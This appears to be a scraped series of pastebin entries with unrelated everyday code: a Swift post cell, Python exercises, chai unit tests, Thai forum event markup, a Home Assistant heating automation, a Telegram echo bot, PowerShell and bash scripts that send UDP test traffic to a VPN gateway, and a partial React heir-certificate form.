            postTitleLabel.trailingAnchor.constraint(equalTo: self.trailingAnchor, constant: -8),
            postTitleLabel.topAnchor.constraint(equalTo: bookmarkIcon.bottomAnchor, constant: 8),
            
            postImageView.leadingAnchor.constraint(equalTo: self.leadingAnchor),
            postImageView.trailingAnchor.constraint(equalTo: self.trailingAnchor),
            postImageView.topAnchor.constraint(equalTo: postTitleLabel.bottomAnchor, constant: 8),
            postImageView.heightAnchor.constraint(lessThanOrEqualToConstant: 300),
            
            postActionsView.leadingAnchor.constraint(equalTo: self.leadingAnchor),
            postActionsView.trailingAnchor.constraint(equalTo: self.trailingAnchor),
            
            self.bottomAnchor.constraint(equalTo: postActionsView.bottomAnchor, constant: 8)
        ])
    }

    func toggleFavorite() {
        PersistenceManager.updateWith(favorite: post!, actionType: post!.isSaved ? .remove : .add) { [weak self] error in
            guard let self else { return }
            
            guard error != nil else {
                self.toggleBookmarkIconState()
                return
            }
        }
    }
    
    private func toggleBookmarkIconState() {
        DispatchQueue.main.async { [weak self] in
            guard let self else { return }
            UIView.transition(
                with: self,
                duration: 0.15,
                options: .transitionCrossDissolve) {
                    self.bookmarkIcon.isHidden.toggle()
                }
        }
    }
    
    func setBlank() {
        self.postImageView.image = nil
        self.postImageView.sd_cancelCurrentImageLoad()
        postActionsViewTopToImageConstraint?.isActive = false
        postActionsViewTopToTitleConstraint?.isActive = true
    }
    
    func configure(post: Post) {
        self.post = post
        
        postActionsView.shareButton.addTarget(self, action: #selector(shareButtonTapped), for: .touchUpInside)
        
        postDetailsView.configure(author: post.data.author, postTime: post.data.createdAt, domain: post.data.subreddit)
        
        bookmarkIcon.isHidden = !post.isSaved
        postTitleLabel.text = post.data.title

        if let imageLink = post.data.preview?.images.first?.source.url {
            postImageViewHeightConstraint = postImageView.heightAnchor.constraint(lessThanOrEqualToConstant: 300)
            
            postImageViewHeightConstraint?.isActive = true
            
            postActionsViewTopToTitleConstraint?.isActive = false
            postActionsViewTopToImageConstraint?.isActive = true
            postImageView.isHidden = false
            
            postImageView.sd_setImage(with: imageLink, placeholderImage: UIImage().withTintColor(.secondaryLabel))
        } else {
            postImageView.isHidden = true
            postActionsViewTopToImageConstraint?.isActive = false
            postActionsViewTopToTitleConstraint?.isActive = true
        }
        
        postActionsView.configure(post: post)
    }
    
    @objc private func shareButtonTapped() {
        delegate?.didTapShareButton(for: post!)
    }
}
"
3MYg10VN,Untitled,Nenogzar,Python,Tuesday 13th of February 2024 01:00:06 PM CDT,"def check_win_counter(energy, distance_to_enemy, win_counter):
    if distance_to_enemy <= energy:
        energy -= distance_to_enemy
        win_counter += 1
    else:
        print(f""Not enough energy! Game ends with {win_counter} won battles and {energy} energy"")
        return False  # С това излизам 

    if win_counter % 3 == 0:
        energy += win_counter

    return win_counter, energy


energy = int(input())
distance_to_enemy = input()
win_counter = 0

while distance_to_enemy != ""End of battle"":
    distance_to_enemy = int(distance_to_enemy)

    result = check_win_counter(energy, distance_to_enemy, win_counter)
    if not result:
        break  # exit the loop if the game ends

    win_counter, energy = result

    distance_to_enemy = input()

if distance_to_enemy == ""End of battle"":
    print(f""Won battles: {win_counter}. Energy left: {energy}"")"
t7diH3q3,"energy = int(input()) distance_to_enemy = input() win_counter = 0  while distance_to_enemy != ""End o",Nenogzar,Python,Tuesday 13th of February 2024 12:58:09 PM CDT,"energy = int(input())
distance_to_enemy = input()
win_counter = 0

while distance_to_enemy != ""End of battle"":

    distance_to_enemy = int(distance_to_enemy)

    if distance_to_enemy <= energy:
        energy -= distance_to_enemy
        win_counter += 1
    else:
        print(f""Not enough energy! Game ends with {win_counter} won battles and {energy} energy"")
        break

    if win_counter % 3 == 0:
        energy += win_counter

    distance_to_enemy = input()

if distance_to_enemy == ""End of battle"":
    print(f""Won battles: {win_counter}. Energy left: {energy}"")"
LfSPQNvf,unit-test1,reddevilvd,JavaScript,Tuesday 13th of February 2024 12:42:38 PM CDT,"const chai = require('chai');
const assert = chai.assert;

suite('Unit Tests', function () {
  suite('Basic Assertions', function () {
    // #1
    test('#isNull, #isNotNull', function () {
      assert.isNull(null, 'This is an optional error description - e.g. null is null');
      assert.isNotNull(1, '1 is not null');
    });
    // #2
    test('#isDefined, #isUndefined', function () {
      assert.isNull(null, 'null is not undefined');
      assert.isUndefined(undefined, 'undefined IS undefined');
      assert.isDefined('hello', 'A string is not undefined');
    });
    // #3
    test('#isOk, #isNotOk', function () {
      assert.isNull(null, 'null is falsey');
      assert.isOk(""I'm truthy"", 'A string is truthy');
      assert.isOk(true, 'true is truthy');
    });
    // #4
    test('#isTrue, #isNotTrue', function () {
      assert.isTrue(true, 'true is true');
      assert.isTrue(!!'double negation', 'Double negation of a truthy value is true');
      assert.isNotTrue({ value: 'truthy' }, 'Objects are truthy, but are not boolean values');
    });
  });

  // -----------------------------------------------------------------------------

  suite('Equality', function () {
    // #5
    test('#equal, #notEqual', function () {
      assert.equal(12 , '12', 'Numbers are coerced into strings with ==');
      assert.notEqual({ value: 1 }, { value: 1 }, '== compares object references');
      assert.equal(6 * '2', '12');
      assert.notEqual(6 + '2' , '12');
    });
    // #6
    test('#strictEqual, #notStrictEqual', function () {
      assert.notStrictEqual(6, '6');
      assert.strictEqual(6, 3 * 2);
      assert.strictEqual(6 * '2', 12);
      assert.notStrictEqual([1, 'a', {}], [1, 'a', {}]);
    });

    // #7
    test('#deepEqual, #notDeepEqual', function () {
      assert.deepEqual({ a: '1', b: 5 }, { b: 5, a: '1' }, ""The order of keys doesn't matter"");
      assert.notDeepEqual({ a: [5, 6] }, { a: [6, 5] }, 'The order of array elements does matter');
    });
  });

  // -----------------------------------------------------------------------------

  function weirdNumbers(delta) {
    return 1 + delta - Math.random();
  }

  suite('Comparisons', function () {
    // #8
    test('#isAbove, #isAtMost', function () {
      assert.isAtMost('hello'.length, 5);
      assert.isAbove(1, 0);
      assert.isAbove(Math.PI, 3);
      assert.isAtMost(1 - Math.random(), 1);
    });
    // #9
    test('#isBelow, #isAtLeast', function () {
      assert.isAtLeast('world'.length, 5);
      assert.isAtLeast(2 * Math.random(), 0);
      assert.isBelow(5 % 2, 2);
      assert.isBelow(2 / 3, 1);
    });
    // #10
    test('#approximately', function () {
      assert.approximately(weirdNumbers(0.5), 1, 0.5);
      assert.approximately(weirdNumbers(0.2), 1, 0.8);
    });
  });

  // -----------------------------------------------------------------------------

  const winterMonths = ['dec,', 'jan', 'feb', 'mar'];
  const backendLanguages = ['php', 'python', 'javascript', 'ruby', 'asp'];
  suite('Arrays', function () {
    // #11
    test('#isArray, #isNotArray', function () {
      assert.isArray('isThisAnArray?'.split(''), 'String.prototype.split() returns an array');
      assert.isNotArray([1, 2, 3].indexOf(2), 'indexOf returns a number');
    });
    // #12
    test('Array #include, #notInclude', function () {
      assert.notInclude(winterMonths, 'jul', ""It's summer in july..."");
      assert.include(backendLanguages, 'javascript', 'JS is a backend language');
    });
  });

  // -----------------------------------------------------------------------------

  const formatPeople = function (name, age) {
    return '# name: ' + name + ', age: ' + age + '\n';
  };
  suite('Strings', function () {
    // #13
    test('#isString, #isNotString', function () {
      assert.isNotString(Math.sin(Math.PI / 4), 'A float is not a string');
      assert.isString(process.env.PATH, 'An env variable is a string (or undefined)');
      assert.isString(JSON.stringify({ type: 'object' }), 'JSON is a string');
    });
    // #14
    test('String #include, #notInclude', function () {
      assert.include('Arrow', 'row', ""'Arrow' contains 'row'"");
      assert.notInclude('dart', 'queue', ""But 'dart' doesn't contain 'queue'"");
    });
    // #15
    test('#match, #notMatch', function () {
      const regex = /^#\sname\:\s[\w\s]+,\sage\:\s\d+\s?$/;
      assert.match(formatPeople('John Doe', 35), regex);
      assert.notMatch(formatPeople('Paul Smith III', 'twenty-four'), regex);
    });
  });

  // -----------------------------------------------------------------------------

  const Car = function () {
    this.model = 'sedan';
    this.engines = 1;
    this.wheels = 4;
  };

  const Plane = function () {
    this.model = '737';
    this.engines = ['left', 'right'];
    this.wheels = 6;
    this.wings = 2;
  };

  const myCar = new Car();
  const airlinePlane = new Plane();

  suite('Objects', function () {
    // #16
    test('#property, #notProperty', function () {
      assert.notProperty(myCar, 'wings', ""Cars don't have wings"");
      assert.property(airlinePlane, 'engines', 'Planes have engines');
      assert.property(myCar, 'wheels', 'Cars have wheels');
    });
    // #17
    test('#typeOf, #notTypeOf', function () {
      assert.typeOf(myCar, 'object');
      assert.typeOf(myCar.model, 'string');
      assert.notTypeOf(airlinePlane.wings, 'string');
      assert.typeOf(airlinePlane.engines, 'array');
      assert.typeOf(myCar.wheels, 'number');
    });
    // #18
    test('#instanceOf, #notInstanceOf', function () {
      assert.notInstanceOf(myCar, Plane);
      assert.instanceOf(airlinePlane, Plane);
      assert.instanceOf(airlinePlane, Object);
      assert.notInstanceOf(myCar.wheels, String);
  });  
  });

  // -----------------------------------------------------------------------------
});"
PiYLcRJx,Warm Up My Belly,Kelly-B9978,CSS,Tuesday 13th of February 2024 12:36:28 PM CDT,"<link href=""https://dl.dropbox.com/scl/fi/o75o25r3dwmxtpycy16pa/warmup.css?rlkey=643kh25dvbhbcsizfblee10ki"" rel=""stylesheet"">
<div id=""zzzcode""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""wumb-box""><div class=""wumb-head""><img src=""https://i.imgur.com/JybisEb.png""><img src=""https://i.imgur.com/lnhS0Kn.png""></div>
<div class=""wumb-logo""><img src=""https://i.imgur.com/PweQnJe.png""></div>
<div class=""wumb-divider""></div>
<div class=""wumb-item""><img src=""https://i.imgur.com/UKeQIYQ.png""></div>
<br><center><div class=""wumb-subtitle"">[color=#ff1d48]Couple Cute Neko Cup[/color]</div>
เซตเครื่องดื่มต้อนรับเทศกาลแห่งความรักจากคาเฟ่ริมน้ำ
[b]พิเศษ ![/b] ซื้อเซตเครื่องดื่ม 1 เซต รับคูปองทำเวิร์กช็อปตัดเสื้อให้น้องเหมียวไปเลย
<br><div class=""wumb-title"">ลุ้นรับค่าความสัมพันธ์สูงสุด 5 แต้ม !</div>
และรางวัลอื่น ๆ อีกมากมาย
<br><div class=""wumb-subtitle"">[i]ไม่มาไม่ได้แล้วนะ เมี๊ยว ![/i]</div></center><div class=""wumb-divider""></div>
<div class=""wumb-title"">เงื่อนไขการเข้าร่วมเวิร์กช็อป</div>
<ol><li>ซื้อเครื่องดื่มเซต [b][color=#ff1d48]Couple Cute Neko Cup[/color][/b] 1 โรลเพลย์ ที่[url=https://roleplayth.com/showthread.php?tid=20]เคาน์เตอร์สั่งอาหารและเครื่องดื่ม[/url] พร้อมรับคูปองเข้าร่วมเวิร์กช็อปทำชุดให้แมว</li>
<li>นำคูปองมาแลกอุปกรณ์ทำชุดกับพนักงาน 1 โรลเพลย์ ที่[url=https://roleplayth.com/showthread.php?tid=2981]โซนคาเฟ่แมว[/url]</li>
<li>ล้างมือให้สะอาดและวัดขนาดตัวแมวที่ต้องการ 1 โรลเพลย์</li>
<li>ทำชุดแมว 1 โรลเพลย์</li>
<li>สวมให้แมว 1 โรลเพลย์</li>
<li>รวบรวมลิงก์ทั้งหมดส่งในกระทู้นี้ ตามแบบฟอร์มที่กำหนดให้</li></ol>
<div class=""wumb-form"">[b]แบบฟอร์ม[/b]<hr>ชื่อ : 
เผ่าพันธุ์ :
แมวที่ได้รับชุด :
หลักฐาน : [color=#a65973](ลิงก์โรลเพลย์)[/color]</div>
<div class=""wumb-divider""></div>
<div class=""wumb-title"">รางวัลการเข้าร่วมเวิร์กช็อป</div>
<ol><li>แมวแต่ละตัวจะมีรางวัลสำหรับคนแรกที่ทำชุดให้</li>
<li>สิทธิ์สุ่มค่าความสัมพันธ์ 1-5 แต้ม/ตัว</li>
<li>สิทธิ์แลกซื้อไอเทมสมบัติล้ำค่า [b][color=#ff1d48]Couple Cute Neko Cup[/color][/b] ($500)</li></ol>
<br><div class=""wumb-title"">รางวัลพิเศษ</div>
สำหรับผู้ที่สะสมค่าความสัมพันธ์จากแมวได้[b]มากที่สุด[/b] [b][color=#ff1d48]รับไอเทมสมบัติล้ำค่าฟรี ! มูลค่า 500 ดอลลาร์[/color][/b]
<div class=""wumb-divider""></div>
<div class=""wumb-title"">หมายเหตุ</div>
<ol><li>ผู้เข้าร่วมกิจกรรมสามารถทำชุดให้แมวตัวเดียวกันได้ แต่รางวัลจะตกเป็นของ[b]คนแรกที่ทำให้[/b] ส่วนคนอื่นจะได้รับเพียงสิทธิ์สุ่มค่าความสัมพันธ์เท่านั้น</li>
<li>ผู้เข้าร่วมกิจกรรมสามารถทำชุดให้แมวหลายตัวได้ แต่จะได้[b]รับรางวัลเพียงครั้งเดียว[/b] น้องแมวตัวที่เหลือจะได้รับเป็นสิทธิ์สุ่มค่าความสัมพันธ์</li></ol>
<div class=""wumb-divider""></div>
<div class=""wumb-title"">ระยะเวลาเข้าร่วมเวิร์กช็อป</div>
<center>[size=x-large]14 - 20 กุมภาพันธ์ 2567[/size]</center>
</div></div>"
4PvbiR6z,Untitled,fabrizio97726,YAML,Tuesday 13th of February 2024 12:16:23 PM CDT,"alias: Inizio riscaldamento automatico
description: """"
trigger:
  - platform: time
    at: input_datetime.ora_inizio_automazione
  - platform: time_pattern
    seconds: ""59""
  - condition: state
    entity_id: group.famiglia
    state: not_home    
condition:
  - condition: state
    entity_id: input_boolean.modalita_inverno_riscaldamento_automatico
    state: ""on""
  - condition: time
    after: input_datetime.ora_inizio_automazione
    before: input_datetime.ora_fine_riscaldamento
  - condition: numeric_state
    entity_id: input_number.temperatura_target
    above: sensor.temperatura_impostata_salotto
	
action:
  - if:
      - condition: trigger
        entity_id: group.famiglia
        
    then:
      - service: climate.turn_on
        metadata: {}
        data: {}
        target:
          entity_id: climate.living_room
      - service: climate.set_temperature
        metadata: {}
        data:
          temperature: ""{{ states('input_number.temperatura_non_in_casa')| float(0) }}""
          hvac_mode: heat
        target:
          entity_id: climate.living_room
    else:
      - service: climate.turn_on
        metadata: {}
        data: {}
        target:
          entity_id: climate.living_room
      - service: climate.set_temperature
        metadata: {}
        data:
          temperature: ""{{ states('input_number.temperatura_target')| float(0) }}""
          hvac_mode: heat
        target:
          entity_id: climate.living_room
mode: single
"
hm5cpLh7,main.py,jtprog,Python,Tuesday 13th of February 2024 12:13:36 PM CDT,"""""""
Synergy Telegram Bot
""""""

import logging
import os
import re
from distutils.util import strtobool

from prometheus_client import start_http_server, Summary, Counter
from telegram import Update
from telegram.ext import (
    CommandHandler,
    MessageHandler,
    filters,
    ApplicationBuilder,
    ContextTypes,
)

# Чтение токена из переменной окружения
TOKEN = os.getenv(""TG_BOT_TOKEN"", default=None)
DEBUG = bool(strtobool(os.getenv(""DEBUG"", default=""False"")))
METRICS_PORT = int(os.getenv(""METRICS_PORT"", default=8000))


if TOKEN is None:
    raise ValueError(""TG_BOT_TOKEN is not set"")

# Create a metric to track time spent and requests made.
REQUEST_TIME = Summary(
    ""bot_request_processing_seconds"", ""Time spent processing request""
)
FAILURE_COUNTER = Counter(""bot_failures"", ""Number of failures"")
CANCELED_MSG_COUNTER = Counter(""bot_canceled_messages"", ""Number of canceled messages"")
STMT_COUNTER = Counter(""bot_statements"", ""Number of statements executed"", [""statement""])
COMMAND_CALL_COUNTER = Counter(
    ""bot_command_calls"", ""Number of command calls"", [""command""]
)

config = dict()

if DEBUG:
    config[""log_level""] = logging.DEBUG
else:
    config[""log_level""] = logging.INFO


# Настройка логирования
class SensitiveFormatter(logging.Formatter):
    """"""Formatter that removes sensitive information in urls.""""""

    @staticmethod
    def _filter(s):
        return re.sub(r""bot[0-9]{9,10}:[a-zA-Z0-9-]{35}"", r""secret_token"", s)

    def format(self, record):
        original = logging.Formatter.format(self, record)
        return self._filter(original)


LOG_FORMAT = ""%(asctime)s [%(threadName)-16s] %(filename)27s:%(lineno)-4d %(levelname)7s| %(message)s""

logging.basicConfig(
    format=LOG_FORMAT,
    level=config[""log_level""],
)

for handler in logging.root.handlers:
    handler.setFormatter(SensitiveFormatter(LOG_FORMAT))
logger = logging.getLogger(__name__)


# Decorate function with metric.
@REQUEST_TIME.time()
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """"""Обработка команды start.""""""

    msg = (
        f""**Привет\!**\nЯ помогу вам рассылать сообщения\.\n\n""
        + f""\/ping \- проверка жизнеспособности\n""
        + f""\/help \- для получения справки""
    )

    await update.message.reply_markdown_v2(msg)
    logger.info(
        ""start_command - access allowed for user with user_id: %s username: (@%s)"",
        update.message.from_user.id,
        update.message.from_user.username,
    )
    COMMAND_CALL_COUNTER.labels(""start_command"").inc()


# Decorate function with metric.
@REQUEST_TIME.time()
async def help_command(update: Update, context):
    """"""Обработка команды help.""""""

    msg = ""<b>Пук! Среньк!</b>\n/ping - проверка жизнеспособности""
    await update.message.reply_html(msg)
    logger.info(
        ""help_command - access allowed for user with user_id: %s username: (@%s)"",
        update.message.from_user.id,
        update.message.from_user.username,
    )
    COMMAND_CALL_COUNTER.labels(""help_command"").inc()


@REQUEST_TIME.time()
async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """"""Обработка команды ping.""""""

    await update.message.reply_text(""PONG"")
    logger.info(
        ""ping_command - access allowed for user with user_id: %s username: (@%s)"",
        update.message.from_user.id,
        update.message.from_user.username,
    )
    COMMAND_CALL_COUNTER.labels(""ping_command"").inc()


# Decorate function with metric.
@REQUEST_TIME.time()
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """"""Обработка входящих сообщений.""""""

    user_message = update.message.text  # Получаем текст сообщения от пользователя
    repeated_message = (
        user_message * 10
    )  # Дублируем сообщение 10 раз, добавляя перенос строки для удобства чтения
    await update.message.reply_text(
        repeated_message
    )  # Отправляем обратно дублированный текст


# Функции обработчики команд будут здесь
async def error(update, context):
    """"""Логируем ошибки, вызванные обновлениями.""""""

    FAILURE_COUNTER.inc()
    logger.error('Update ""%s"" caused error ""%s""', update, context.error)


def main():
    # Start up the server to expose the metrics.
    start_http_server(METRICS_PORT)

    # Создаем бота
    application = ApplicationBuilder().token(TOKEN).build()
    logger.info(""main - application created"")

    # Регистрация обработчиков команд и ошибок будет здесь
    application.add_error_handler(error)
    application.add_handler(CommandHandler(""start"", start_command))
    application.add_handler(CommandHandler(""help"", help_command))
    application.add_handler(CommandHandler(""ping"", ping_command))
    application.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler)
    )
    logger.info(""main - handlers added"")

    application.run_polling()


if __name__ == ""__main__"":
    main()
"
icQPFccL,Send-UdpDatagram.ps1,mdriscoll93,PowerShell,Tuesday 13th of February 2024 12:12:33 PM CDT,"function Send-UdpDatagram
{
      Param ([string] $EndPoint,
      [int] $Port,
      [string] $Message)
 
      $IP = [System.Net.Dns]::GetHostAddresses($EndPoint)
      $Address = [System.Net.IPAddress]::Parse($IP)
      $EndPoints = New-Object System.Net.IPEndPoint($Address, $Port)
      $Socket = New-Object System.Net.Sockets.UDPClient
      $EncodedText = [Text.Encoding]::ASCII.GetBytes($Message)
      $SendMessage = $Socket.Send($EncodedText, $EncodedText.Length, $EndPoints)
      $Socket.Close()
}
 
# function becomes available after loading into your ISE environment
# Send-UdpDatagram -EndPoint ""<REMOTE_GW_IP>"" -Port 500 -Message ""test.mymetric:0|c""
# Send-UdpDatagram -EndPoint ""<REMOTE_GW_IP>"" -Port 4500 -Message ""test.myothermetric:0|c"""
XrRykuMy,ikev2_generate_traffic.sh,mdriscoll93,Bash,Tuesday 13th of February 2024 11:49:58 AM CDT,"#!/bin/env bash

ikev2_generate_traffic() {
    read -r -p ""Enter the remote GW IP: "" RemoteGW

    # Generate IKE traffic.
    echo ""Generating IKE traffic...""
    echo ""111"" | run_with_timeout 5 nc -u -w1 ""$RemoteGW"" 500
    if ! run_with_timeout;
    then
        echo ""Error sending data to UDP port 500!""
        return 1
    fi

    echo ""112"" | run_with_timeout 5 nc -u -w1 ""$RemoteGW"" 4500
    if ! run_with_timeout;
    then
        echo ""Error sending data to UDP port 4500!""
        return 1
    fi

    # Generate ESP traffic.
    echo ""Generating ESP traffic...""

    run_with_timeout 20 ping -c 10 ""$RemoteGW""
    if ! run_with_timeout;
    then
        echo ""Ping command failed!""
        # Decide whether to exit or continue. Uncomment the next line to exit.
        # return 1
    fi

    run_with_timeout 20 traceroute ""$RemoteGW""
    if ! run_with_timeout;
    then
        echo ""Traceroute command failed!""
        return 1
    fi
}
ikev2_generate_traffic"
rV0Vkcru,Algoritmi lezione 8,fcamuso,C#,Tuesday 13th of February 2024 11:40:45 AM CDT,"//divide et impera

#include <iostream>
#include <chrono>

using namespace std;
#include ""../utility_vettori.h""

long long tot_chiamate = 0;

string cerca_stringa_max(string v[], int sx, int dx)
{
  tot_chiamate++;

  string min_sx = """", min_dx = """";

  if (sx==dx) //un elemento solo
  {
    return v[sx];
  }
  else
    if (sx + 1 == dx ) //due elementi
    {
      if (v[sx]>v[dx])
        return v[sx];
      else
        return v[dx];
    }
    else
    {
      int mediano = sx +(dx - sx)/2;
      //cout << sx << "" "" << mediano << endl;
      min_sx = cerca_stringa_max(v, sx, mediano);

      //cout << mediano+1 << "" "" << dx << endl;
      min_dx = cerca_stringa_max(v, mediano+1, dx);
    }

    if (min_sx>min_dx)
      return min_sx;
    else
      return min_dx;
}


const int QUANTI_ELEMENTI = 98304;
string v[QUANTI_ELEMENTI];

int main()
{
  carica_vettore_stringhe(v, QUANTI_ELEMENTI - 1, 10);

  v[QUANTI_ELEMENTI-1] = string(100, 'z');

  //ordino dal più piccolo al più grande
  for (int i=0; i<QUANTI_ELEMENTI-1; i++)
    for (int j=i+1; j<QUANTI_ELEMENTI; j++)
      if (v[j]>v[i]) swap(v[i], v[j]);

  int numero_run = 1;
  int ripetizioni_per_run = 1;


// RICERCA CON RESTITUZIONE DELL'ELEMENTO MASSIMO
  string s = """";
  Cronometro(Stato::START);
  for(int conta_run =0; conta_run<numero_run; conta_run++)
    for (int conta=0; conta<ripetizioni_per_run; conta++)
      s = cerca_stringa_max(v, 0, QUANTI_ELEMENTI - 1);

  cout << ""Tempo impiegato (ELEMENTO): "" << Cronometro(Stato::STOP) << endl;
  cout << ""STRINGA MAX: "" << s << endl;

  cout << ""Numero chiamate alla funzione: "" << tot_chiamate << endl;

  return 0;
}
"
g9KJYxvr,HeirApplicationAdd.js,shawon_majid,JavaScript,Tuesday 13th of February 2024 11:28:59 AM CDT,"import axios from ""axios"";
import React, { useState } from ""react"";
import { NavLink } from ""react-router-dom"";
import backendURL from ""../consts"";

// const HeirInformation = ({ inheritor, index }) => {
//   return (
//     <tr key={index}>
//       <th scope=""row"" className=""text-center"">
//         {index + 1}
//       </th>
//       <td className=""text-center"">
//         <input
//           type=""text""
//           className=""form-control""
//           id=""text""
//           placeholder=""নাম""
//           name=""inheritorName""
//           value={inheritor.inheritorName}
//           onChange={(e) => {}}
//         />
//       </td>
//       <td className=""text-center"">
//         <input
//           type=""text""
//           className=""form-control""
//           id=""text""
//           placeholder=""সম্পর্ক""
//         />
//       </td>
//       <td className=""text-center"">
//         <input
//           type=""text""
//           className=""form-control""
//           id=""text""
//           placeholder=""মন্তব্য""
//         />
//       </td>
//       <td className=""text-center"">
//         {index == 0 ? null : (
//           <button
//             type=""button""
//             className=""btn-icon btn-outline-lightblue font-weight-bold mr-2""
//           >
//             -
//           </button>
//         )}
//         <button
//           type=""button""
//           className=""btn-icon btn-outline-lightblue font-weight-bold mr-2""
//         >
//           +
//         </button>
//       </td>
//     </tr>
//   );
// };

const HeirApplicationAdd = () => {
  const [heirInfo, setHeirInfo] = useState({
    applicantsName: """",
    fathersName: """",
    mothersName: """",
    spousesName: """",
    voterIdNo: """",
    mobileNo: """",
    nationality: """",
    wardNo: 5,
    postOffice: """",
    upozilla: """",
    district: """",
    nameOfDead: """",
    fathersNameOfDead: """",
    mothersNameOfDead: """",
    spousesNameOfDead: """",
    voterIdNoOfDead: """",
    mobileNoOfDead: """",
    nationalityOfDead: """",
    wardNoOfDead: """",
    postOfficeOfDead: """",
    upozillaOfDead: """",
    districtOfDead: """",
    listOfInheritors: [
      {
        inheritorName: """",
        relationship: """",
        comment: """",
      },
      {
        inheritorName: """",
        relationship: """",
        comment: """",
      },
    ],
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setHeirInfo({ ...heirInfo, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    // axios call for sending to database
    try {
      await axios.post(
        backendURL + ""/api/inheritance-certificate/add"",
        heirInfo
      );
    } catch (err) {
      console.log(err);
    }
  };

  const HeirInformation = ({ inheritor, index }) => {
    return (
      <tr>
        <th scope=""row"" className=""text-center"">
          {index + 1}
        </th>
        <td className=""text-center"">
          <input
            type=""text""
            className=""form-control""
            id=""text""
            placeholder=""নাম""
            name=""inheritorName""
            value={inheritor.inheritorName}
            onChange={(e) => {
              const { name, value } = e.target;

              setHeirInfo({
                ...heirInfo,
                listOfInheritors: heirInfo.listOfInheritors.map((item, idx) =>
                  idx === index ? { ...item, [name]: value } : item
                ),
              });
            }}
          />
        </td>
        <td className=""text-center"">
          <input
            type=""text""
            className=""form-control""
            id=""text""
            placeholder=""সম্পর্ক""
          />
        </td>
        <td className=""text-center"">
          <input
            type=""text""
            className=""form-control""
            id=""text""
            placeholder=""মন্তব্য""
          />
        </td>
        <td className=""text-center"">
          {index == 0 ? null : (
            <button
              type=""button""
              className=""btn-icon btn-outline-lightblue font-weight-bold mr-2""
            >
              -
            </button>
          )}
          <button
            type=""button""
            className=""btn-icon btn-outline-lightblue font-weight-bold mr-2""
          >
            +
          </button>
        </td>
      </tr>
    );
  };

  return (
    <>
      <div className=""content-wrapper"">
        {/* ---------------- Content Header Page Header ---------------- */}
        <div className=""content-header"">
          <div className=""container-fluid"">
            <div className=""row mb-2"">
              <div className=""col-sm-6"">
                <h1 className=""m-0"">ওয়ারিশান সনদের আবেদন</h1>
              </div>
              <div className=""col-sm-6"">
                <ol className=""breadcrumb float-sm-right"">
                  <li className=""breadcrumb-item"">
                    <NavLink to=""/"">হোম</NavLink>
                  </li>
                  <li className=""breadcrumb-item active"">
                    ওয়ারিশান সনদের আবেদন
                  </li>
                </ol>
              </div>
            </div>
          </div>
        </div>
        {/* ---------------- Main Content Start ---------------- */}
        <section className=""content"">
          <div className=""container-fluid"">
            {/* ---------------- Container Start ---------------- */}
            <div className=""row"">
              <div className=""col-lg-3 col-md-3 col-sm-3""></div>
              <div className=""col-lg-3 col-md-3 col-sm-3""></div>
              <div className=""col-lg-3 col-md-3 col-sm-3""></div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <button type=""button"" className=""btn btn-block btn-lightblue"">
                  সবগুলো দেখুন
                </button>
              </div>
            </div>
            <div className=""row mt-3 p-3 rounded main-bg"">
              {/* <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">Text</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""Text""
                  />
                </div>
              </div> */}
              <div className=""col-lg-12 col-md-12 col-sm-12 pt-4 pb-3"">
                <h4 className=""text-center"">আবেদনকারীর তথ্য</h4>
              </div>

              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">আবেদনকারীর নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""আবেদনকারীর নাম""
                    name=""applicantsName""
                    value={heirInfo.applicantsName}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">পিতার নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""পিতার নাম""
                    name=""fathersName""
                    value={heirInfo.fathersName}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মাতার নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মাতার নাম""
                    name=""mothersName""
                    value={heirInfo.mothersName}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">স্বামী/স্ত্রী-র নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""স্বামী/স্ত্রী-র নাম""
                    name=""spousesName""
                    value={heirInfo.spousesName}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ভোটার আইডি নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ভোটার আইডি নং""
                    name=""voterIdNo""
                    value={heirInfo.voterIdNo}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মোবাইল নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মোবাইল নং""
                    name=""mobileNo""
                    value={heirInfo.mobileNo}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">জাতীয়তা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""জাতীয়তা""
                    name=""nationality""
                    value={heirInfo.nationality}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ওয়ার্ড নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ওয়ার্ড নং""
                    name=""wardNo""
